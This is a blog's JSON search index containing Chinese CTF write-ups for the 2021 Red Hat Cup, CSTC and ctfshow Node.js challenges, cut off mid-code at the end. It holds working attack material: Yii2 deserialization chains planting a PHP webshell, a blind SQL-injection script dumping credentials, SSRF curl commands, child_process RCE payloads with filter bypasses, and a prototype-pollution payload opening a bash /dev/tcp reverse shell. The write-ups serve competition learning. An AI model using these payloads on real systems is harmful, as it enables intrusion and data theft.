{"meta":{"title":"TARI TARI","subtitle":"","description":"","author":"TARI TARI","url":"https://tari.moe","root":"/"},"pages":[{"title":"","date":"2021-04-01T02:48:42.200Z","updated":"2021-04-01T02:48:42.200Z","comments":true,"path":"404.html","permalink":"https://tari.moe/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"我滴朋友们","date":"2021-04-01T07:30:59.293Z","updated":"2021-04-01T07:30:59.293Z","comments":true,"path":"friends/index.html","permalink":"https://tari.moe/friends/index.html","excerpt":"","text":""},{"title":"","date":"2021-05-09T15:59:42.912Z","updated":"2021-05-09T15:59:42.891Z","comments":true,"path":"about/index.html","permalink":"https://tari.moe/about/index.html","excerpt":"","text":"欢迎大佬来访, 本小破站主要用于个人记录 ~ Web 小菜一枚, 喜欢 CTF, 精通各大CTF赛事的签到题 ( 就读于佛科院 (佛大, 等学校啥时候改名字, 就可以换了 耶~) 在校期间主要负责学校服务器安全运维、内网渗透、组织参加CTF、开发一些小工具… 简而言之就是多功能搬砖人, 哪里需要搬哪里 ~ 欢迎各位评论留言一起讨论各种琐琐碎 ~"},{"title":"所有标签","date":"2021-04-01T02:44:50.837Z","updated":"2021-04-01T02:44:50.837Z","comments":true,"path":"tags/index.html","permalink":"https://tari.moe/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"2021 红帽杯前3Web题 Writeup（持续更新）","slug":"2021hmb","date":"2021-05-09T15:01:51.000Z","updated":"2021-05-12T00:40:40.341Z","comments":true,"path":"2021/05/09/2021hmb/","link":"","permalink":"https://tari.moe/2021/05/09/2021hmb/","excerpt":"","text":"今年红帽杯好像难度比往年友好了不少 （ find_it目录爆破 &gt; robots.txt &gt; 1ndexx.php &gt; 尝试常见信息泄漏得 .1ndexx.php.swp 访问 http://eci-2zeg1tmyhxfbomoq43gy.cloudeci1.ichunqiu.com/.1ndexx.php.swp 得 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php $link = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;); ?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Hello worldd!&lt;/title&gt; &lt;style&gt; body &#123; background-color: white; text-align: center; padding: 50px; font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif; &#125; #logo &#123; margin-bottom: 40px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;img id=&quot;logo&quot; src=&quot;logo.png&quot; /&gt; &lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;/h1&gt; &lt;?php if($link) &#123; ?&gt; &lt;h2&gt;I Can&#x27;t view my php files?!&lt;/h2&gt; &lt;?php &#125; else &#123; ?&gt; &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt; &lt;?php &#125; ?&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php#Really easy...$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);$a=$_GET[&#x27;code&#x27;];if(preg_match(&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;,$a))&#123; die(&quot;you die&quot;);&#125;if(strlen($a)&gt;33)&#123; die(&quot;nonono.&quot;);&#125;fwrite($hack,$a);fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);fclose($file);fclose($hack);?&gt; 写入 phpinfo 访问 hack.php 在 phpinfo 页面搜索 flag 关键字即可 framework目录爆破得源码 www.zip 看网页源码和源码易知框架为 Yii2 找控制器， 刚好之前复现了一点 yii2 的反序列化，不过没详细分析 https://www.yuque.com/u2292949/ugffdq/hfgzlc 不过知道控制点在 即通过 call_user_func 调用函数，找个POC，有兴趣可以看看分析过程，传送门 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;phpinfo&#x27;; $this-&gt;id = &quot;123&quot;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;isRunning&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;// poc2namespace Codeception\\Extension&#123; use Faker\\Generator; class RunProcess&#123; private $processes; public function __construct() &#123; $this-&gt;processes = [new Generator()]; &#125; &#125;&#125;namespace&#123; // 生成poc echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));&#125;?&gt; Yii2 的控制器路由说明（即 index.php?r=site/about&amp;message= 部分）可参考 https://www.yiiframework.com/doc/guide/2.0/zh-cn/start-hello 构造 EXP 搜了下发现有 disable function 禁用了这些函数 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,mail,putenv,error_log,error_reporting,unset,unlink,return 虽然没有过滤 eval 但 call_user_func 第一个参数只能为回调函数，试了很久，发现 assert 可用，于是构造POC。 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;assert&#x27;; $this-&gt;id = &#x27;file_put_contents(&quot;/var/www/html/web/j.php&quot;, \\&#x27;&lt;?php eval($_POST[&quot;s&quot;]); ?&gt;\\&#x27;);&#x27;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; $this-&gt;formatters[&#x27;isRunning&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;// poc2namespace Codeception\\Extension&#123; use Faker\\Generator; class RunProcess&#123; private $processes; public function __construct() &#123; $this-&gt;processes = [new Generator()]; &#125; &#125;&#125;namespace&#123; // 生成poc echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));&#125;?&gt; 写入一句话，连接 因为有 disable function 限制执行命令，因此需要bypass 尝试常用bypass 方法 无效，然后下面链接有一些姿势没来得及试，等复现出来可以试试 https://www.freebuf.com/articles/network/263540.html 坐等其他师傅WP （ 5月12日更新 突然发现了简单的做法，没想到 phpggc 自定义代码功能还挺好用的 1phpggc Yii2/RCE2 &#x27;eval($_REQUEST[&quot;ant&quot;]);&#x27; | base64 然后绕过 disable function 的方法是 Apache_mode_cgi，晚些搭环境看看为啥比赛时我没法成功绕过的.. WebsiteManger注入点在 image.php 二分法时间延迟注入 脚本来自 Challenger 师傅 1234567891011121314151617181920212223import requestsurl = &#x27;http://eci-2zefme7yqvztnh81ouvm.cloudeci1.ichunqiu.com/image.php?id=&#x27;flag = &quot;&quot;for i in range(1,100): low = 32 high = 128 while low &lt; high: mid = int((low + high) / 2) content = &quot;select/**/group_concat(username,&#x27;:&#x27;,password)/**/from/**/users&quot; sql = f&quot;if(ascii(substr((&#123;content&#125;),&#123;i&#125;,1))&lt;&#123;mid&#125;,1,2)&quot; url2 = url+sql r = requests.get(url2) if len(r.content) == 50811: high = mid else: low = mid + 1 if low == high == 32: print(&quot;&#123;&#125;&quot;.format(flag)) break flag += chr(int((high + low - 1) / 2)) print(&quot;flag : &#123;&#125;&quot;.format(flag)) 使用 admin 和 密码 登录后 SSRF 即可 5月12日更新 看到有人说 modify.php 是可以未授权访问的… ezlight还没看。。。撇了一眼源码，好像是 Laravel？出题人怕不是在 ctfshow 出题的。。 一个 Yii2 一个 Laravel。。。 5月12日更新 晚点如果有环境就复现吧（ 先放一下有第四题wp的题解 总结emm，不知怎么回事，第一题一开始访问 .1ndexx.php.swp 竟然没反应，当然还试了 gedit 的 xx~，佛了 第二题，，一开始 assert 用不了，说什么参数不能是可控的，后面又行了，，这中间找函数和尝试浪费了好多好多时间。。。导致后面绕过 disable function 时间不够。 第三题，总体难度不大 （逃 反思： 虽然之前看了很多 disable function bypass 的文章，但是没动手做过，不够熟练， 把常用 disable function bypass 过一遍 刷了部分然后一直在吃灰的 sqli-labs 是时候理理了…","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"比赛","slug":"ctf/比赛","permalink":"https://tari.moe/categories/ctf/%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"比赛","slug":"比赛","permalink":"https://tari.moe/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"2021CSTC网络安全技术大赛 Writeup","slug":"2021CSTC-ctf","date":"2021-05-06T08:02:43.000Z","updated":"2021-05-09T15:03:57.428Z","comments":true,"path":"2021/05/06/2021CSTC-ctf/","link":"","permalink":"https://tari.moe/2021/05/06/2021CSTC-ctf/","excerpt":"","text":"这次比赛打完，发现自己还是太菜了。。 虽然排名还可以 （因为有逆向大佬在。。。 web2和web3 感觉接近了，现把做出来的写上 看看后面有复现环境会复现，没有的话看下其他师傅的写写复盘。 由于web2和3实在没思路了，然后顺手解了2个简单的杂项。 这里要吐槽一点，为什么题目不是下发 docker 容器形式的，，这样别人如果 getshell 不就可以改代码逻辑搞破坏了吗？ easyweb代码 1234567891011121314151617181920212223242526272829303132&lt;?phpshow_source(__FILE__);$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET[&#x27;foo&#x27;]);if(is_array($a))&#123; is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope&quot;):NULL; if(@$a[&quot;bar1&quot;])&#123; ($a[&quot;bar1&quot;]&gt;2021)?$v1=1:NULL; &#125; if(is_array(@$a[&quot;bar2&quot;]))&#123; if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope&quot;); $pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]); $pos===false?die(&quot;nope&quot;):NULL; foreach($a[&quot;bar2&quot;] as $key=&gt;$val)&#123; $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL; &#125; $v2=1; &#125;&#125;$c=@$_GET[&#x27;cat&#x27;];$d=@$_GET[&#x27;dog&#x27;];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope&quot;):NULL; strpos(($c[0].$d), &quot;cstc2021&quot;)?$v3=1:NULL; &#125;&#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; include &quot;flag.php&quot;; echo $flag;&#125;?&gt; bar1 和 bar2 凑一下 eregi函数可用 %00 截断，在凑一下 bar3 即可 payload 1http:&#x2F;&#x2F;49.232.167.183:30001&#x2F;?foo&#x3D;&#123;%22bar1%22:%222022a%22,%22bar2%22:[[1],2,3,4,5],%22a2%22:[%22nudt%22]&#125;&amp;cat[0]&#x3D;%00cstc2021&amp;cat[1][0]&#x3D;1&amp;dog&#x3D;222 flag{c32b71bb4aa5c4b2e7a8453f012f9c3e} easyweb2提示1： http://49.232.167.183:30012/swagger-ui.html 提示2： 已经拿到管理员token的队伍，关注/home/index接口 登录爆破获取token 不过这个 token 无效 163a44f5fd4368923e62469611d232a02 爆破 /uid 接口 123&#123;&quot;用户ID&quot;:&quot;987&quot;,&quot;用户组&quot;:&quot;系统管理员&quot;,&quot;用户名&quot;:&quot;ctf_admin&quot;,&quot;HASH&quot;:&quot;2773d5bd7e1a7a7eec619c6d5fbdfd3a&quot;&#125;&#123;&quot;用户ID&quot;:&quot;101&quot;,&quot;用户组&quot;:&quot;普通用户&quot;,&quot;用户名&quot;:&quot;test&quot;,&quot;HASH&quot;:&quot;098f6bcd4621d373cade4e832627b4f6&quot;&#125; md 碰撞出密码得到 Token 19c618e664319512ef7db2d3c0672bee0 访问不到时，会返回 ???? 尝试了以下 EXP和一些变形，不过都读不到 flag，，害 1234567891011121314151617curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://xxxx/1.txt&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://xxxx/t1.php&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=dict://127.0.0.1:6379/_info%250a&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=file:///flag&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%22&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://0:30012/image/hacker.jpg&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://xxx:2233/&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://xxx5:2233/ HTTP/1.1\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: 119.28.15.55:2233\\r\\n\\r\\nGET / HTTP/1.1\\r\\ntest:&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://49.232.167.183:30012/&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot; 服务端是java来的，但感觉禁用了 file 之类的协议，， 不过不知道怎样利用，，卡在这了 2021.5.6 17:17 更新 麻了，看了别人题解 https://blog.csdn.net/m0_51078229/article/details/116423096 1curl -X GET &quot;http://49.232.167.183:30012/home/index?url=http://127.0.0.1/flag.txt&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot; 这个 flag.txt 在哪是猜的还是哪里有提示的？要是因为猜不到文件名而做不出来也太那啥了。。 2021.5.6 22:03 更新 https://blog.csdn.net/qyCraner/article/details/116459918 又找了个题解，发现发送请求请求 ftp 端口 1curl -X GET &quot;http://49.232.167.183:30012/home/index?url=ftp://127.0.0.1:21/&quot; -H &quot;accept: */*&quot; -H &quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot; 会返回文件信息 1-rw-r--r-- 1 root root 39 Apr 30 09:56 flag.txt 然后在读取就好了….这个试起来有点小麻烦感觉， ，主要是不知道协议、IP和端口…而且题目速度访问速度贼慢，题目本身会保持连接，burp不方便fuzz，这一点感觉要找（弄）个工具 web3目录爆破得 robots.txt &gt; 然后访问 PassOn &gt; &gt; 得到源码 http://49.232.3.115:49496/PassOn/PassOnbackupDirect0ry/backup.zip 结合源码reset.php， 其实密码就是时间戳部分，sha1 哈希，取前面 20位 1$password = substr(hash(&#x27;sha1&#x27;, gmdate(&quot;l jS \\of F Y h:i:s A&quot;)), 0, 20); 然后帐号和邮箱在 css/style.css 注释里 重置密码 发现登录不上。。可能压根就不是改了这个密码？ 1$sql = $pdo-&gt;prepare(&quot;UPDATE PassOn SET pass = :pass where id = 1&quot;); 先试试用脚本跑，因为我和别人同时在做，防止时间差 贴贴脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import hashlibimport requestsimport threadingflag = Falseuser = &#x27;Ptn4rdn&#x27;passwd = &#x27;&#x27;email = &#x27;Ptn4rdn@gmail.com&#x27;loginUrl = &#x27;http://49.232.3.115:49496/PassOn/login.php&#x27;resetPassUrl = &#x27;http://49.232.3.115:49496/PassOn/reset.php&#x27;def resetPasswd(): global passwd resetData = &#123; &#x27;email&#x27;: email, &#x27;user&#x27;: user, &#x27;submit&#x27;: &#x27;reset&#x27; &#125; gmdate = requests.post(loginUrl, resetData).content[-86:-49] sha1 = hashlib.sha1() sha1.update(gmdate) passwd = sha1.hexdigest()[:20] print(passwd)def login(): global flag, passwd loginData = &#123; &#x27;email&#x27;: email, &#x27;pass&#x27;: passwd, &#x27;submit&#x27;: &#x27;submit&#x27; &#125; res = requests.post(resetPassUrl, loginData) if res.headers.get(&#x27;Cookie&#x27;, 0): flag = True print(passwd) print(res.headers) exit()while flag is False: a = threading.Thread(target=resetPasswd) b = threading.Thread(target=login) a.start() b.start() 不太行。。后面利用大概是有思路了，卡在登录这。。。 2021.5.6 22:09 更新 https://blog.csdn.net/qyCraner/article/details/116459918 找了个题解，发现别人可以正常登录上去的。。不知道我哪步错了，请教一波做出来的师傅。。他也说我做的步骤没毛病，，晕了。 登录进去后就比较简单了，记录失败日志会把邮箱记录到 .php 文件里，把邮箱写成马就行。主要是这个 php 文件，记录 session 信息，如果没登录访问不了这个马。写入马后连接拿flag就好了。 hackerweb这题还没看，堵在第2和第3题了…看看有没有复现环境，主要是别人的wp不是很详细，也还没动手做。 RGB文件为RGB三原色组合，尝试还原图片 1234567891011121314151617181920212223242526from PIL import Imagedef Crack(n): flag = [] for each in range(2,int(n **0.5)+1): if(n % each == 0): print(each,int(n/each)) flag += [(each,int(n/each))] if len(flag) == 1:return flag[0] else: choice = input(&quot;选择第几组(0-%s):&quot;%(len(flag)-1)) return flag[int(choice)]def Paint(X,Y,listrgb): pic = Image.new(&quot;RGB&quot;,(X, Y)) i=0 for x in range (0,X): for y in range (0,Y): temp = listrgb[i].split(&#x27;,&#x27;) pic.putpixel([x,y],(int(temp[0]),int(temp[1]),int(temp[2]))) i = i+1 pic.show() #pic.save(&quot;./flag%s.png&quot;%(X))listrgb = open(&quot;code.txt&quot;).readlines()X,Y = Crack(len(listrgb))Paint(X,Y,listrgb)Paint(Y,X,listrgb) 跑一下脚本选择第 12 组，然后水平翻转一下即可。 flag{c1d836d1db9d42dd} zip压缩包密码爆破得 ff123 readme.txt 。尝试摩斯密码和培根密码，发现是培根密码，跑跑脚本。 12345678910111213141516171819202122import retable = &#123;&#x27;a&#x27;: &#x27;aaaaa&#x27;, &#x27;b&#x27;: &#x27;aaaab&#x27;, &#x27;c&#x27;: &#x27;aaaba&#x27;, &#x27;d&#x27;: &#x27;aaabb&#x27;, &#x27;e&#x27;: &#x27;aabaa&#x27;, &#x27;f&#x27;: &#x27;aabab&#x27;, &#x27;g&#x27;: &#x27;aabba&#x27;, &#x27;h&#x27;: &#x27;aabbb&#x27;, &#x27;i&#x27;: &#x27;abaaa&#x27;, &#x27;j&#x27;: &#x27;abaab&#x27;, &#x27;k&#x27;: &#x27;ababa&#x27;, &#x27;l&#x27;: &#x27;ababb&#x27;, &#x27;m&#x27;: &#x27;abbaa&#x27;, &#x27;n&#x27;: &#x27;abbab&#x27;, &#x27;o&#x27;: &#x27;abbba&#x27;, &#x27;p&#x27;: &#x27;abbbb&#x27;, &#x27;q&#x27;: &#x27;baaaa&#x27;, &#x27;r&#x27;: &#x27;baaab&#x27;, &#x27;s&#x27;: &#x27;baaba&#x27;, &#x27;t&#x27;: &#x27;baabb&#x27;, &#x27;u&#x27;: &#x27;babaa&#x27;, &#x27;v&#x27;: &#x27;babab&#x27;, &#x27;w&#x27;: &#x27;babba&#x27;, &#x27;x&#x27;: &#x27;babbb&#x27;, &#x27;y&#x27;: &#x27;bbaaa&#x27;, &#x27;z&#x27;: &#x27;bbaab&#x27;&#125;def bacon(cipher): msg = &#x27;&#x27; codes = re.findall(r&#x27;.&#123;5&#125;&#x27;, cipher) for code in codes: if code == &#x27;&#x27;: msg += &#x27; &#x27; else: UNCODE = dict(map(lambda t: (t[1], t[0]), table.items())) msg += UNCODE[code] return msgif __name__ == &#x27;__main__&#x27;: cipher = &#x27;BABBBBBAAAABAAB&#x27; cipher = cipher.lower() plaintext = bacon(cipher) print(plaintext) 解出来得知 word 文档密码 xyj 颜色隐藏获取 flag{cbfacb9df0c7caf9a2b8a8ffbd72d1a0}","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"比赛","slug":"ctf/比赛","permalink":"https://tari.moe/categories/ctf/%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"比赛","slug":"比赛","permalink":"https://tari.moe/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"ctfshow nodejs篇","slug":"ctfshow-nodejs","date":"2021-05-04T13:50:42.000Z","updated":"2021-05-06T08:04:49.599Z","comments":true,"path":"2021/05/04/ctfshow-nodejs/","link":"","permalink":"https://tari.moe/2021/05/04/ctfshow-nodejs/","excerpt":"","text":"web342 很刺激 （ 感觉对原型链污染理解又加深了呢~ web334 JS 大小写特性搜集了半天信息，发现题目描述处有源码可以直接下载。。 user.js 12345module.exports = &#123; items: [ &#123;username: &#x27;CTFSHOW&#x27;, password: &#x27;123456&#x27;&#125; ]&#125;; login.js 123456789101112131415161718192021222324252627282930313233var express = require(&#x27;express&#x27;);var router = express.Router();var users = require(&#x27;../modules/user&#x27;).items; var findUser = function(name, password)&#123; return users.find(function(item)&#123; return name!==&#x27;CTFSHOW&#x27; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; &#125;);&#125;;/* GET home page. */router.post(&#x27;/&#x27;, function(req, res, next) &#123; res.type(&#x27;html&#x27;); var flag=&#x27;flag_here&#x27;; var sess = req.session; var user = findUser(req.body.username, req.body.password); if(user)&#123; req.session.regenerate(function(err) &#123; if(err)&#123; return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;&#125;); &#125; req.session.loginUser = user.username; res.json(&#123;ret_code: 0, ret_msg: &#x27;登录成功&#x27;,ret_flag:flag&#125;); &#125;); &#125;else&#123; res.json(&#123;ret_code: 1, ret_msg: &#x27;账号或密码错误&#x27;&#125;); &#125; &#125;);module.exports = router; 即满足 1name!==&#x27;CTFSHOW&#x27; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; 我们输入的 name 不为 CTFSHOW 然后 name 转换后的大写为 CTFSHOW ，密码为 123456 即可。 网上看了一下，其实想要的考点是 toUpperCase() 函数，字符 ı 会转变为 I ，字符 ſ 会变为 S 。 toLowerCase() 函数中，字符 İ 会转变为 i ，字符 K 会转变为 k 。 可以参考 https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html 这样的应该是，比如字符 s 或 S 不能出现在输入字符中就好了。 web335 RCEf12 源码提示 1&lt;!-- /?eval= --&gt; 即简单命令执行 1/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString() 获取 flag 1&#x2F;?eval&#x3D;require(%27child_process%27).spawnSync(%27cat%27,[%27fl00g.txt%27]).stdout.toString() web336 RCE 黑名单绕过f12 源码提示 1&lt;!-- /?eval= --&gt; 即简单命令执行 1/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString() 获取 flag 1/?eval=require(%27child_process%27).spawnSync(%27cat%27,[%27fl001g.txt%27]).stdout.toString() emm 好像就 flag 文件换了个名字？ 顺便收集多几个命令执行 123require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).stdout.toString()require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;,[&#x27;.&#x27;]).toString() 收集过程中发现，原来第 2、3 个 被禁了，2333 原来考察黑名单 先通过全局变量读取当前目录位置 1/?eval=__filename 当前目录 1/?eval=__dirname 读文件 1/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;,&#x27;utf-8&#x27;) 发现过滤了exec和load 绕过方法 1?eval=require(&#x27;child_process&#x27;)[&#x27;exe&#x27;+&#x27;cSync&#x27;](&#x27;ls&#x27;).toString() 因为 require(&#39;child_process&#39;) 方法返回一个对象，可以通过类型 Python数组的方式去访问里面的成员。 或者用其他模块读文件 12/?eval=require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;,&#x27;utf-8&#x27;) 当然还有其他姿势，比如变量拼接在执行 1var%20s=%27global.process.mainModule.constructor._lo%27;var%20b=&quot;ad(%27child_process%27).ex&quot;;var%20c=&quot;ec(%27cat+fl001g.txt&gt;public/1.txt%27);&quot;;eval(s%2Bb%2Bc); web337 md5绕过12345678910111213141516171819202122232425var express = require(&#x27;express&#x27;);var router = express.Router();var crypto = require(&#x27;crypto&#x27;);function md5(s) &#123; return crypto.createHash(&#x27;md5&#x27;) .update(s) .digest(&#x27;hex&#x27;);&#125;/* GET home page. */router.get(&#x27;/&#x27;, function(req, res, next) &#123; res.type(&#x27;html&#x27;); var flag=&#x27;xxxxxxx&#x27;; var a = req.query.a; var b = req.query.b; if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123; res.end(flag); &#125;else&#123; res.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;); &#125; &#125;);module.exports = router; 和 PHP 一样，数组绕过即可 1/?a[]=1&amp;b=1 发现这样更易于理解 payload: a[x]=1&amp;b[x]=2 运行一下代码 1234567891011a=&#123;&#x27;x&#x27;:&#x27;1&#x27;&#125;b=&#123;&#x27;x&#x27;:&#x27;2&#x27;&#125;console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)a=[1]b=[2]console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;) web338 原型链污染题目描述处蓝奏云下载源码 📎web338.zip 先看看这篇文章了解一波什么是 JS 的原型链污染 https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html 关键代码 utils/common.js 123456789function copy(object1, object2)&#123; for (let key in object2) &#123; if (key in object2 &amp;&amp; key in object1) &#123; copy(object1[key], object2[key]) &#125; else &#123; object1[key] = object2[key] &#125; &#125; &#125; routes/login.js 123456var secert = &#123;&#125;;....utils.copy(user,req.body); if(secert.ctfshow===&#x27;36dboy&#x27;)&#123; res.end(flag); &#125; 也就是说，我们不用关心 secert 是否有 ctfshow 这个属性，因为当它找不到这个属性时，它会从它自己的原型里找。 这里的 secert 是一个数组，然后 utils.copy(user,req.body); 操作是 user 也是数组，也就是我们通过 req.body 即 POST 请求体传入参数，通过 user 污染数组的原型，那么 secert 数组找不到 ctfshow 属性时，会一直往原型找，直到在数组原型中发现 ctfshow 属性值为 36dboy 。那么 if 语句即判断成功，就会输出 flag 了。 payload 1&#123;&quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125; 一般遇到这种整套代码，特别是带有 package.json 的，可以尝试 snyk ， 发现个 ejs 的 RCE https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/ 1&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/监听端口 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;&#125; 先污染参数 然后随便请求一下，触发 render 方法 成功反弹 shell 不过 snyk 给出的 poc 用 filename 参数利用好像有点问题， 不太清楚为啥。。即 1&#123;&quot;__proto__&quot;:&#123;&quot;filename&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/监听端口 0&gt;&amp;1\\&quot;&#x27;);var __tmp2&quot;&#125;&#125; 顺便记录一下 node 项目本地启动方法，在项目文件运行下面命令即可。 1npm start 默认端口为 3000 web339 原型链污染 +node/v10.19.0 题目描述处蓝奏云下载源码 📎web339.zip 和 web338 有点相似，不过不同点是 123456var flag=&#x27;flag_here&#x27;;....utils.copy(user,req.body);if(secert.ctfshow===flag)&#123; res.end(flag); &#125; flag 是变量，具体值不知 然后还多了个 api.js ，主要关注这行 1res.render(&#x27;api&#x27;, &#123; query: Function(query)(query)&#125;); 是不是和 web338 里的参考链接 PHITHON 师傅出的 Code-Breaking 2018 Thejs 如出一辙？即可以 RCE，因为这里可污染点存在的匿名函数调用 https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165 https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L225 仿照题目中的代码，先写个小demo 1234567891011121314function copy(object1, object2)&#123; for (let key in object2) &#123; if (key in object2 &amp;&amp; key in object1) &#123; copy(object1[key], object2[key]) &#125; else &#123; object1[key] = object2[key] &#125; &#125; &#125;user = &#123;&#125;body = 